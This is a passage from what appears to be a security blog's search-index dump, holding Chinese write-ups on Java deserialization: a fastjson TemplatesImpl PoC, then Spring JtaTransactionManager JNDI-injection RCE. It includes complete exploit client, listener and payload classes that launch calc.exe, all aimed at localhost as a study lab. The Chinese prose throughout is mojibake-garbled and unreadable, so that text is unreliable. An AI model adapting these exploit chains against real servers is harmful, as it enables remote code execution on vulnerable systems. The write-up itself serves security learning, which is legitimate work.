java.io.File;import java.io.FileInputStream;import java.io.IOException;/** * Created by web on 2017/4/29. */public class Poc &#123; public static String readClass(String cls)&#123; ByteArrayOutputStream bos = new ByteArrayOutputStream(); try &#123; IOUtils.copy(new FileInputStream(new File(cls)), bos); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return Base64.encodeBase64String(bos.toByteArray()); &#125; public static void test_autoTypeDeny() throws Exception &#123; ParserConfig config = new ParserConfig(); final String fileSeparator = System.getProperty(\"file.separator\"); final String evilClassPath = System.getProperty(\"user.dir\") + \"\\\\target\\\\classes\\\\person\\\\Test.class\"; String evilCode = readClass(evilClassPath); final String NASTY_CLASS = \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\"; String text1 = \"&#123;\\\"@type\\\":\\\"\" + NASTY_CLASS + \"\\\",\\\"_bytecodes\\\":[\\\"\"+evilCode+\"\\\"],\" + \"'_name':'a.b',\" + \"'_tfactory':&#123; &#125;,\" + \"\\\"_outputProperties\\\":&#123; &#125;&#125;\\n\"; System.out.println(text1); //String personStr = \"&#123;'name':\"+text1+\",'age':19&#125;\"; //Person obj = JSON.parseObject(personStr, Person.class, config, Feature.SupportNonPublicField); Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField); //assertEquals(Model.class, obj.getClass()); &#125; public static void main(String args[])&#123; try &#123; test_autoTypeDeny(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; æ€»ç»“ä¸Šé¢å…¶å®åªæ˜¯fastjsonååºåˆ—åŒ–çš„ä¸€ç§åˆ©ç”¨æ–¹å¼ï¼Œè¿˜æœ‰åŸºäºJDNIï¼ˆè®¾ç½®lookupå±æ€§ï¼‰ã€åŸºäºClassLoaderï¼ˆ æ„é€ classNameä¸ºä¸€ä¸ªç‰¹æ®Šçš„å­—ç¬¦ä¸²æ—¶ï¼Œé€šè¿‡è¿™ä¸ªç±»åŠ è½½å™¨æ¥å®ç°å¯¹è‡ªå®šä¹‰ç±»çš„åŠ è½½ ï¼‰çš„åˆ©ç”¨æ–¹å¼ã€‚ æ”¯æŒjdk1.7ï¼Œ1.8 è¯¥pocåªèƒ½è¿è¡Œåœ¨fastjson-1.2.22åˆ°fastjson-1.2.24ç‰ˆæœ¬åŒºé—´ï¼Œå› ä¸ºfastjsonä»1.2.22ç‰ˆæœ¬æ‰å¼€å§‹å¼•å…¥SupportNonPublicFieldã€‚ ä¸è¿‡æ­¤ç§åˆ©ç”¨æ–¹å¼éœ€è¦åœ¨è§£æjsonä¸²æ—¶è®¾ç½®Feature.SupportNonPublicFieldï¼Œè€Œä¸šåŠ¡é€šå¸¸åœ¨ä½¿ç”¨fastjsonæ—¶å¾€å¾€ä¼šç›´æ¥æŒ‰ç…§é»˜è®¤å‚æ•°è°ƒç”¨parseObject()æ–¹æ³•ï¼Œæ‰€ä»¥ç•¥ä¸ºé¸¡è‚‹ã€‚ å‚è€ƒé“¾æ¥ http://xxlegend.com/2017/04/29/title-%20fastjson%20%E8%BF%9C%E7%A8%8B%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96poc%E7%9A%84%E6%9E%84%E9%80%A0%E5%92%8C%E5%88%86%E6%9E%90/","categories":[],"tags":[{"name":"java","slug":"java","permalink":"https://glotozz.github.io/tags/java/"}]},{"title":"Javaååºåˆ—åŒ–æ¼æ´-Spring RCE","slug":"Javaååºåˆ—åŒ–æ¼æ´-Spring RCE","date":"2020-02-29T01:38:56.000Z","updated":"2020-03-25T08:05:56.044Z","comments":true,"path":"2020/02/29/Javaååºåˆ—åŒ–æ¼æ´-Spring RCE/","link":"","permalink":"https://glotozz.github.io/2020/02/29/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-Spring%20RCE/","excerpt":"ä¸»è¦é€šè¿‡springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ javaååºåˆ—åŒ–åŸç†åŠåˆ©ç”¨","text":"ä¸»è¦é€šè¿‡springä¸­çš„ååºåˆ—åŒ–æ¼æ´å’ŒFastJsonååºåˆ—åŒ–æ¼æ´å­¦ä¹ javaååºåˆ—åŒ–åŸç†åŠåˆ©ç”¨ &nbsp; &nbsp; &nbsp;&nbsp;&nbsp;ç®€é™‹çš„ç›®å½• åŸºç¡€çŸ¥è¯† Springååºåˆ—åŒ–æ¼æ´ å‚è€ƒé“¾æ¥ åŸºç¡€çŸ¥è¯†ä¸ºä»€ä¹ˆä¼šæœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–? åˆ©ç”¨ååºåˆ—åŒ–å°†ç¨‹åºè¿è¡Œçš„å¯¹è±¡çŠ¶æ€ä»¥äºŒè¿›åˆ¶å½¢å¼å‚¨å­˜ä¸æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œç„¶åå¯ä»¥åœ¨å¦ä¸€ä¸ªç¨‹åºä¸­å¯¹åºåˆ—åŒ–åçš„å¯¹è±¡çŠ¶æ€æ•°æ®è¿›è¡Œååºåˆ—åŒ–æ¢å¤å¯¹è±¡ã€‚ åºåˆ—åŒ–éœ€è¦æ»¡è¶³çš„ä¸¤ä¸ªæ¡ä»¶ è¯¥ç±»å¿…é¡»å®ç°java.io.Serializableæ¥å£ã€‚ è¯¥ç±»çš„æ‰€æœ‰å±æ€§å¿…é¡»æ˜¯å¯åºåˆ—åŒ–çš„ã€‚å¦‚æœæœ‰ä¸€ä¸ªå±æ€§ä¸æ˜¯å¯åºåˆ—åŒ–çš„ï¼Œåˆ™è¯¥å±æ€§å¿…é¡»æ³¨æ˜æ˜¯çŸ­æš‚çš„ã€‚ ååºåˆ—åŒ–ä»£ç ä¸¾ä¾‹ 1234567891011121314151617181920212223242526272829303132333435import java.io.*;public class SerializeTest &#123; public static void main(String[] args) &#123; Test test = new Test(); test.name = \"gqy\"; test.age = \"18\"; try&#123; // æ‰“å¼€ä¸€ä¸ªæ–‡ä»¶è¾“å…¥æµ FileOutputStream fileOut = new FileOutputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectOutputStream out = new ObjectOutputStream(fileOut); //è¾“å‡ºååºåˆ—åŒ–å¯¹è±¡ out.writeObject(test); out.close(); fileOut.close(); System.out.println(\"Serialized data is saved!!\"); //ååºåˆ—åŒ–æå–å¯¹è±¡ FileInputStream fileIn = new FileInputStream(\"F:\\\\IdeaProjects\\\\javadeserialization\\\\src\\\\test1.db\"); // å»ºç«‹å¯¹è±¡è¾“å…¥æµ ObjectInputStream in = new ObjectInputStream(fileIn); // è¯»å–å¯¹è±¡ Test test1 = null; test1 = (Test) in.readObject(); in.close(); fileIn.close(); System.out.println(test1.name); test1.eat(); &#125;catch (IOException | ClassNotFoundException i)&#123; i.printStackTrace(); &#125; &#125;&#125; æŸ¥çœ‹ä¸‹åºåˆ—åŒ–åçš„æ•°æ®ï¼Œåªèƒ½çœ‹åˆ°ä¸å®Œæ•´çš„ä¿¡æ¯ ååºåˆ—åŒ–æ¼æ´demo åœ¨Javaååºåˆ—åŒ–ä¸­ï¼Œä¼šè°ƒç”¨è¢«ååºåˆ—åŒ–çš„readObjectæ–¹æ³•ï¼Œå½“readObjectæ–¹æ³•ä¹¦å†™ä¸å½“æ—¶å°±ä¼šå¼•å‘æ¼æ´ã€‚ PSï¼šæœ‰æ—¶ä¹Ÿä¼šä½¿ç”¨readUnshared()æ–¹æ³•æ¥è¯»å–å¯¹è±¡ï¼ŒreadUnshared()ä¸å…è®¸åç»­çš„readObjectå’ŒreadUnsharedè°ƒç”¨å¼•ç”¨è¿™æ¬¡è°ƒç”¨ååºåˆ—åŒ–å¾—åˆ°çš„å¯¹è±¡ï¼Œè€ŒreadObjectè¯»å–çš„å¯¹è±¡å¯ä»¥ã€‚ 1234567891011121314151617181920212223242526272829303132import java.io.*;public class test&#123; public static void main(String args[]) throws Exception&#123; UnsafeClass Unsafe = new UnsafeClass(); Unsafe.name = \"hacked by ph0rse\"; FileOutputStream fos = new FileOutputStream(\"object\"); ObjectOutputStream os = new ObjectOutputStream(fos); //writeObject()æ–¹æ³•å°†Unsafeå¯¹è±¡å†™å…¥objectæ–‡ä»¶ os.writeObject(Unsafe); os.close(); //ä»æ–‡ä»¶ä¸­ååºåˆ—åŒ–objå¯¹è±¡ FileInputStream fis = new FileInputStream(\"object\"); ObjectInputStream ois = new ObjectInputStream(fis); //æ¢å¤å¯¹è±¡ UnsafeClass objectFromDisk = (UnsafeClass)ois.readObject(); System.out.println(objectFromDisk.name); ois.close(); &#125;&#125;class UnsafeClass implements Serializable&#123; public String name; //é‡å†™readObject()æ–¹æ³• private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; ä¸»è¦æ˜¯è¿™é‡Œçš„é‡å†™äº†readObject() æ¼æ´èµ·æº é‡å†™ObjectInputStreamå¯¹è±¡çš„resolveClassæ–¹æ³•ä¸­çš„æ£€æµ‹å¯è¢«ç»•è¿‡ã€‚ ä½¿ç”¨ç¬¬ä¸‰æ–¹çš„ç±»è¿›è¡Œé»‘åå•æ§åˆ¶ã€‚è™½ç„¶Javaçš„è¯­è¨€ä¸¥è°¨æ€§è¦æ¯”PHPå¼ºçš„å¤šï¼Œä½†åœ¨å¤§å‹åº”ç”¨ä¸­æƒ³è¦é‡‡ç”¨é»‘åå•æœºåˆ¶ç¦ç”¨æ‰æ‰€æœ‰å±é™©çš„å¯¹è±¡å‡ ä¹æ˜¯ä¸å¯èƒ½çš„ã€‚å› æ­¤ï¼Œå¦‚æœåœ¨å®¡è®¡è¿‡ç¨‹ä¸­å‘ç°äº†é‡‡ç”¨é»‘åå•è¿›è¡Œè¿‡æ»¤çš„ä»£ç ï¼Œå¤šåŠå­˜åœ¨ä¸€ä¸¤ä¸ªâ€˜æ¼ç½‘ä¹‹é±¼â€™å¯ä»¥åˆ©ç”¨ã€‚å¹¶ä¸”é‡‡å–é»‘åå•æ–¹å¼ä»…ä»…å¯èƒ½ä¿è¯æ­¤åˆ»çš„å®‰å…¨ï¼Œè‹¥åœ¨åæœŸæ·»åŠ äº†æ–°çš„åŠŸèƒ½ï¼Œå°±å¯èƒ½å¼•å…¥äº†æ–°çš„æ¼æ´åˆ©ç”¨æ–¹å¼ã€‚æ‰€ä»¥ä»…é é»‘åå•æ˜¯æ— æ³•ä¿è¯åºåˆ—åŒ–è¿‡ç¨‹çš„å®‰å…¨çš„ã€‚ åŸºç¡€åº“ä¸­éšè—çš„ååºåˆ—åŒ–æ¼æ´ 2015å¹´ç”±é»‘å®¢Gabriel Lawrenceå’ŒChris Frohoffå‘ç°çš„â€˜Apache Commons Collectionsâ€™ç±»åº“ç›´æ¥å½±å“äº†WebLogicã€WebSphereã€JBossã€Jenkinsã€OpenNMSç­‰å¤§å‹æ¡†æ¶ã€‚ç›´åˆ°ä»Šå¤©è¯¥æ¼æ´çš„å½±å“ä»æœªæ¶ˆæ•£ã€‚å­˜åœ¨å±é™©çš„åŸºç¡€åº“ï¼š 123456789101112commons-fileupload 1.3.1commons-io 2.4commons-collections 3.1commons-logging 1.2commons-beanutils 1.9.2org.slf4j:slf4j-api 1.7.21com.mchange:mchange-commons-java 0.2.11org.apache.commons:commons-collections 4.0com.mchange:c3p0 0.9.5.2org.beanshell:bsh 2.0b5org.codehaus.groovy:groovy 2.3.9org.springframework:spring-aop 4.1.4.RELEASE Springååºåˆ—åŒ–æ¼æ´é¦–å…ˆéœ€è¦äº†è§£JAVAä½“ç³»ä¸­çš„RMIä»¥åŠJNDI RMIï¼ˆRemote Method Invocationï¼‰ å³Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ï¼Œå¸¸è§çš„ä¸¤ç§æ¥å£å®ç°ä¸ºJRMPï¼ˆJava Remote Message Protocolï¼ŒJavaè¿œç¨‹æ¶ˆæ¯äº¤æ¢åè®®ï¼‰ä»¥åŠCORBAã€‚ JNDI (Java Naming and Directory Interface)æ˜¯ä¸€ä¸ªåº”ç”¨ç¨‹åºè®¾è®¡çš„APIï¼Œä¸ºå¼€å‘äººå‘˜æä¾›äº†æŸ¥æ‰¾å’Œè®¿é—®å„ç§å‘½åå’Œç›®å½•æœåŠ¡çš„é€šç”¨ã€ç»Ÿä¸€çš„æ¥å£ã€‚JNDIæ”¯æŒçš„æœåŠ¡ä¸»è¦æœ‰ä»¥ä¸‹å‡ ç§ï¼šDNSã€LDAPã€ CORBAå¯¹è±¡æœåŠ¡ã€RMIç­‰ã€‚ ç®€å•è¯´å°±æ˜¯RMIæ³¨å†Œçš„æœåŠ¡å¯ä»¥è®©JNDIåº”ç”¨ç¨‹åºæ¥è®¿é—®ã€‚ JNDI RCEæ¼æ´äº§ç”Ÿçš„åŸå› å°±åœ¨äºå½“æˆ‘ä»¬åœ¨æ³¨å†ŒRMIæœåŠ¡æ—¶ï¼Œå¯ä»¥æŒ‡å®šcodebase urlï¼Œä¹Ÿå°±æ˜¯è¿œç¨‹è¦åŠ è½½ç±»çš„ä½ç½®ï¼Œè®¾ç½®è¯¥å±æ€§å¯ä»¥è®©JDNIåº”ç”¨ç¨‹åºåœ¨åŠ è½½æ—¶åŠ è½½æˆ‘ä»¬æŒ‡å®šçš„ç±» ( ä¾‹å¦‚ï¼šhttp://www.iswin.org/xx.class) ï¼Œè¿™é‡Œè¿˜æœ‰ä¸€ä¸ªæ¯”è¾ƒé‡è¦çš„ç‚¹ï¼Œä¹Ÿæ˜¯è§¦å‘æ¶æ„ä»£ç çš„ç‚¹ï¼Œå½“JNDIåº”ç”¨ç¨‹åºé€šè¿‡lookup(rmiæœåŠ¡çš„åœ°å€)è°ƒç”¨æŒ‡å®šcodebase urlä¸Šçš„ç±»åï¼Œä¼šè°ƒç”¨è¢«è¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬å°†æ¶æ„ä»£ç æ”¾åœ¨è¢«è¿œç¨‹è°ƒç”¨ç±»çš„æ„é€ æ–¹æ³•ä¸­æ—¶ï¼Œæ¼æ´å°±ä¼šè§¦å‘ã€‚ RMIæµ‹è¯•demo 1234567Registry registry &#x3D; LocateRegistry.createRegistry(1999);&#x2F;&#x2F; è®¾ç½®code url è¿™é‡Œå³ä¸ºhttp:&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&#x2F;&#x2F; æœ€ç»ˆä¸‹è½½æ¶æ„ç±»çš„åœ°å€ä¸ºhttp:&#x2F;&#x2F;127.0.0.1:8000&#x2F;ExportObject.classReference reference &#x3D; new Reference(&quot;ExportObject&quot;, &quot;ExportObject&quot;, &quot;http:&#x2F;&#x2F;127.0.0.1:8000&#x2F;&quot;);&#x2F;&#x2F; ReferenceåŒ…è£…ç±»ReferenceWrapper referenceWrapper &#x3D; new ReferenceWrapper(reference);registry.bind(&quot;Object&quot;, referenceWrapper); 1999ç«¯å£æ³¨å†Œäº†RMIæœåŠ¡ï¼Œè®¾ç½®code urlä¸ºhttp://http://127.0.0.1:8000/ï¼Œå®é™…ç±»åŠ è½½ä½ç½®ä¸ºhttp://127.0.0.1:8000/ExportObject.classï¼Œç»‘å®šäº†Objectï¼ŒJNDIè°ƒç”¨çš„åœ°å€ä¸ºhttp://127.0.0.1:8000/Object æ§åˆ¶äº†æ¶æ„ç±»ExportObjectå°±èƒ½RCE JNDIæµ‹è¯•demo Persionç±» 1234567891011121314151617181920212223242526272829303132333435363738import java.io.IOException;import java.io.Serializable;import java.rmi.Remote;public class Person implements Remote,Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125; private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException&#123; //æ‰§è¡Œé»˜è®¤çš„readObject()æ–¹æ³• in.defaultReadObject(); //æ‰§è¡Œå‘½ä»¤ Runtime.getRuntime().exec(\"calc.exe\"); &#125;&#125; æœåŠ¡ç«¯rmiä¸ºä¾‹ 1234567891011121314151617181920212223242526272829303132333435363738import java.rmi.registry.LocateRegistry;import javax.naming.Context;import javax.naming.InitialContext;public class Test3 &#123; public static void initPerson() throws Exception&#123; //é…ç½®JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£ã€‚å¦‚æœæ²¡æœ‰é…ç½®è¿™äº›ä¿¡æ¯ï¼Œä¼šå‡ºç°NoInitialContextExceptionå¼‚å¸¸ //é…ç½®rmi LocateRegistry.createRegistry(3001); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:3001\"); ////åˆå§‹åŒ– InitialContext ctx = new InitialContext(); //å®ä¾‹åŒ–personå¯¹è±¡ Person p = new Person(); p.setName(\"hello\"); p.setPassword(\"jndi\"); //personå¯¹è±¡ç»‘å®šåˆ°JNDIæœåŠ¡ä¸­ï¼ŒJNDIçš„åå­—å«åšï¼špersonã€‚ ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //å› ä¸ºå‰é¢å·²ç»å°†JNDIå·¥å‚å’ŒJNDIçš„urlå’Œç«¯å£å·²ç»æ·»åŠ åˆ°Systemå¯¹è±¡ä¸­ï¼Œè¿™é‡Œå°±ä¸ç”¨åœ¨ç»‘å®šäº† InitialContext ctx = new InitialContext(); //é€šè¿‡lookupæŸ¥æ‰¾personå¯¹è±¡ Person person = (Person) ctx.lookup(\"person\"); //æ‰“å°å‡ºè¿™ä¸ªå¯¹è±¡ System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; æœ¬æ¥æ˜¯è¯»å–personç±»çš„ä¿¡æ¯ï¼Œåœ¨personç±»ä¸­åŠ ä¸Šäº†readObject()æ–¹æ³•ï¼ŒæˆåŠŸRCE Jndiæ³¨å…¥äº§ç”Ÿçš„åŸå›  1ã€lookupå‚æ•°å¯æ§ã€‚ 2ã€InitialContextç±»åŠä»–çš„å­ç±»çš„lookupæ–¹æ³•å…è®¸åŠ¨æ€åè®®è½¬æ¢ 3ã€lookupæŸ¥æ‰¾çš„å¯¹è±¡æ˜¯Referenceç±»å‹åŠå…¶å­ç±» 4ã€å½“è¿œç¨‹è°ƒç”¨ç±»çš„æ—¶å€™é»˜è®¤ä¼šåœ¨rmiæœåŠ¡å™¨ä¸­çš„classpathä¸­æŸ¥æ‰¾ï¼Œå¦‚æœä¸å­˜åœ¨å°±ä¼šå»urlåœ°å€å»åŠ è½½ç±»ã€‚å¦‚æœéƒ½åŠ è½½ä¸åˆ°å°±ä¼šå¤±è´¥ã€‚ è·Ÿè¿›lookup() è·Ÿè¿›getURLOrDefaultInitCtx(name) å³ä½¿ä¸€å¼€å§‹è®¾ç½®äº†Contextï¼Œä¹Ÿæ˜¯å¯ä»¥é‡å†™ä¸ºæˆ‘ä»¬ä¼ å…¥çš„lookup()çš„å‚æ•° ä¸¾ä¾‹ 12345678&#x2F;&#x2F; Create the initial contextHashtable env &#x3D; new Hashtable();env.put(Context.INITIAL_CONTEXT_FACTORY,&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;);env.put(Context.PROVIDER_URL, &quot;rmi:&#x2F;&#x2F;secure-server:1099&quot;);Context ctx &#x3D; new InitialContext(env);&#x2F;&#x2F; Look up in the local RMI registryObject local_obj &#x3D; ctx.lookup(&lt;attacker controlled&gt;); Spring RCE Spring RCEå½¢æˆçš„ä¸»è¦åŸå› æ˜¯ Springæ¡†æ¶çš„spring-tx-xxx.jarä¸­çš„org.springframework.transaction.jta.JtaTransactionManager å­˜åœ¨ä¸€ä¸ªreadObjectæ–¹æ³•ã€‚å½“æ‰§è¡Œå¯¹è±¡ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šæ‰§è¡Œlookupæ“ä½œï¼Œå¯¼è‡´äº†jndiæ³¨å…¥ï¼Œå¯ä»¥å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œé—®é¢˜ ç¯å¢ƒæ­å»º+POC mvn installå‡ºç°æŠ¥é”™[ERROR] ä¸å†æ”¯æŒæºé€‰é¡¹ 5ã€‚è¯·ä½¿ç”¨ 6 æˆ–æ›´é«˜ç‰ˆæœ¬ã€‚ pom.xmlä¸­å¢åŠ mavenç¼–è¯‘çš„jdkç‰ˆæœ¬è®¾ç½® 123456789&lt;plugin&gt; &lt;groupId&gt;org.apache.maven.plugins&lt;&#x2F;groupId&gt; &lt;artifactId&gt;maven-compiler-plugin&lt;&#x2F;artifactId&gt; &lt;version&gt;3.3&lt;&#x2F;version&gt; &lt;configuration&gt; &lt;source&gt;1.8&lt;&#x2F;source&gt; &lt;target&gt;1.8&lt;&#x2F;target&gt; &lt;&#x2F;configuration&gt;&lt;&#x2F;plugin&gt; å‘ç°è¿˜æ˜¯æ²¡ç”¨,Terminalé‡Œé¢çš„javaç‰ˆæœ¬å§‹ç»ˆæ˜¯java11 è§£å†³åŠæ³•ï¼šhelpâ€“&gt;find action ï¼Œè¾“å…¥switch boot jdkï¼Œåˆ‡æ¢æˆè‡ªå·±çš„jdkå³å¯ æŠŠjaråŒ…ä¸‹è½½ä¸‹æ¥ï¼Œåˆ†æä¸€ä¸‹æºç  åˆ©ç”¨ideaè‡ªå¸¦çš„åç¼–è¯‘ï¼Œadd as libraryï¼Œæ³¨æ„æœ€å¥½æ·»åŠ ä¸ºGlobalï¼Œå¦åˆ™å¯èƒ½ä¼šæ‰¾ä¸åˆ°ç±» org.springframework.transaction.jta.JtaTransactionManager å½“ä¸€ä¸ªç±»è¢«ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨è¯¥ç±»çš„readObject()æ–¹æ³•ï¼Œè·Ÿè¿›initUserTransactionAndTransactionManager()æ–¹æ³• è·Ÿè¿›lookupUserTransaction() è°ƒç”¨JndiTemplate.lookup()ï¼Œè¿½è¸ªlookup() è·Ÿè¿›lookup() æ€»ç»“ä¸€ä¸‹è°ƒç”¨é“¾ JtaTransactionManager-&gt;readObject()-&gt;initUserTransactionAndTransactionManager() -&gt;lookupUserTransaction(this.userTransactionName)ï¼Œè¿™é‡Œçš„userTransactionNameæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼ˆsetUserTransactionName()ï¼‰ï¼Œæœ€ç»ˆè§¦å‘ JndiTemplateçš„lookup(userTransactionName)è§¦å‘RCEã€‚æˆ‘ä»¬éœ€è¦æ³¨å†Œä¸€ä¸ªrmiæœåŠ¡ï¼Œå¹¶æä¾›æ¶æ„ç±»ã€‚ æ¼æ´å®ç° å®¢æˆ·ç«¯demo 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071package client.src.main.java;import java.io.IOException;import java.io.ObjectOutputStream;import java.net.InetSocketAddress;import java.net.Socket;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import javax.naming.Reference;import org.springframework.transaction.jta.JtaTransactionManager;import com.sun.jndi.rmi.registry.ReferenceWrapper;import com.sun.net.httpserver.HttpServer;/*** * * @author admin@iswin.org * @time 2016.1.24 */@SuppressWarnings(\"restriction\")public class ExploitClient &#123; /*** * å¯åŠ¨httpæœåŠ¡å™¨ï¼Œæä¾›ä¸‹è½½è¿œç¨‹è¦è°ƒç”¨çš„ç±» * * @throws IOException */ public static void lanuchCodebaseURLServer() throws IOException &#123; System.out.println(\"Starting HTTP server\"); HttpServer httpServer = HttpServer.create(new InetSocketAddress(8000), 0); httpServer.createContext(\"/\", new HttpFileHandler()); httpServer.setExecutor(null); httpServer.start(); &#125; /*** * å¯åŠ¨RMIæœåŠ¡ * * @throws Exception */ public static void lanuchRMIregister() throws Exception &#123; System.out.println(\"Creating RMI Registry\"); Registry registry = LocateRegistry.createRegistry(1999); // è®¾ç½®code url è¿™é‡Œå³ä¸ºhttp://http://127.0.0.1:8000/ // æœ€ç»ˆä¸‹è½½æ¶æ„ç±»çš„åœ°å€ä¸ºhttp://127.0.0.1:8000/ExportObject.class Reference reference = new Reference(\"ExportObject\", \"ExportObject\", \"http://127.0.0.1:8000/\"); // ReferenceåŒ…è£…ç±» ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"Object\", referenceWrapper); &#125; /*** * å‘é€payload * * @throws Exception */ public static void sendPayload() throws Exception &#123; // jndiçš„è°ƒç”¨åœ°å€ String jndiAddress = \"rmi://127.0.0.1:1999/Object\"; // å®ä¾‹åŒ–JtaTransactionManagerå¯¹è±¡ï¼Œå¹¶ä¸”åˆå§‹åŒ–UserTransactionNameæˆå‘˜å˜é‡ JtaTransactionManager object = new JtaTransactionManager(); object.setUserTransactionName(jndiAddress); // å‘é€æ„é€ å¥½çš„payload Socket socket = new Socket(\"127.0.0.1\", 9999); System.out.println(\"Sending object to server...\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(socket.getOutputStream()); objectOutputStream.writeObject(object); objectOutputStream.flush(); socket.close(); &#125; public static void main(String[] args) throws Exception &#123; lanuchCodebaseURLServer(); lanuchRMIregister(); sendPayload(); &#125;&#125; æœåŠ¡ç«¯ 123456789101112131415161718192021222324252627package server.src.main.java;import java.io.*;import java.net.*;public class ExploitableServer &#123; public static void main(String[] args) &#123; try &#123; int port = 9999; ServerSocket serverSocket = new ServerSocket(port); System.out.println(\"Server started on port \"+serverSocket.getLocalPort()); while(true) &#123; Socket socket=serverSocket.accept(); System.out.println(\"Connection received from \"+socket.getInetAddress()); ObjectInputStream objectInputStream = new ObjectInputStream(socket.getInputStream()); try &#123; Object object = objectInputStream.readObject(); System.out.println(\"Read object \"+object); &#125; catch(Exception e) &#123; System.out.println(\"Exception caught while reading object\"); e.printStackTrace(); &#125; &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; payload 123456789101112131415import sun.awt.windows.ThemeReader;public class ExportObject &#123; public ExportObject() &#123; try &#123; while(true) &#123; System.out.println(\"running injected code...\"); Runtime.getRuntime().exec(\"calc.exe\"); Thread.sleep(1000); &#125; &#125; catch(Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; åˆ‡æ¢javaç‰ˆæœ¬ä¸º1.8.0_112ï¼ŒæˆåŠŸ ä¸è¿‡è¿™åªæ˜¯æ¨¡æ‹Ÿäº†æ¼æ´çš„è§¦å‘è¿‡ç¨‹ï¼Œå®¢æˆ·ç«¯ä¹Ÿå°±æ˜¯æ”»å‡»ç«¯ï¼Œå¼€ä¸ªhttpæœåŠ¡8000ï¼Œæ³¨å†ŒrmiæœåŠ¡åˆ°8000ä¸Šï¼Œå¹¶ç»‘å®šæ¶æ„ç±»ã€‚ç„¶åå¼€ä¸ªsocketæœåŠ¡å‘é€payloadåˆ°9999ç«¯å£ï¼Œè¿™é‡Œçš„payloadæ˜¯å°±æ˜¯å°†JtaTransactionManagerååºåˆ—åŒ–ï¼Œå¹¶è®¾ç½®object.setUserTransactionName(jndiAddress);ã€‚String jndiAddress = &quot;rmi://127.0.0.1:1999/Object&quot;;ï¼Œå®é™…æŸ¥æ‰¾ä½ç½®ä¸ºå‰é¢rmiç»‘å®šçš„http://127.0.0.1:8000/Objectã€‚ æœåŠ¡ç«¯å°±æ˜¯å¼€ä¸ªsocketæœåŠ¡ä»9999ç«¯å£æ¥å—æ•°æ®ï¼Œå¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œè‡ªåŠ¨è§¦å‘readobject()ï¼Œç„¶åæœ€ç»ˆè§¦å‘lookup()ï¼Œjndiè®¿é—®æˆ‘ä»¬æ³¨å†Œçš„rmiæœåŠ¡ï¼Œè§¦å‘æ¶æ„ç±»çš„æ„é€ å‡½æ•°ã€‚ åˆ©ç”¨æ¡ä»¶ 1ã€å­˜åœ¨æ¥å£è¿›è¡Œåºåˆ—åŒ–æ“ä½œ 2ã€è®¿é—®å¯¹è±¡å¯ä»¥å‡ºç½‘ 3ã€ç›®æ ‡å¯¹è±¡ä¸­çš„CLASSPATHå­˜åœ¨Sping-tx-xxx.jar æ€»ç»“ Spring-tx-xx.jaræ–‡ä»¶ä¸æ˜¯ä¸­é—´ä»¶çš„é»˜è®¤ç»„ä»¶ï¼Œæ‰€ä»¥ï¼Œè¯¥æ¼æ´å°±æ¯”è¾ƒé¸¡è‚‹ ã€‚ å®é™…å·¥ç¨‹ä¸­å¯èƒ½ä¼šå­˜åœ¨å°†ç¼ºé™·jaræ–‡ä»¶æ”¾åœ¨ä¸­é—´ä»¶çš„ç±»åŠ è½½å™¨ä¸­çš„æƒ…å†µï¼Œ å³æ‰€æœ‰åº”ç”¨éƒ½å¯ä»¥è®¿é—®è¿™ä¸ªjarï¼Œé‚£ä¹ˆæ¼æ´å°±å¯ä»¥åˆ©ç”¨ PSï¼šæœ¬æ¥æƒ³æŠŠFastjsonååºåˆ—åŒ–æ¼æ´ä¹Ÿå†™åœ¨è¿™é‡Œçš„ï¼Œä½†æ˜¯é˜²æ­¢ç¯‡å¹…è¿‡é•¿ï¼Œå¦å†™ä¸€ç¯‡ğŸ¤¦â€â™‚ï¸ 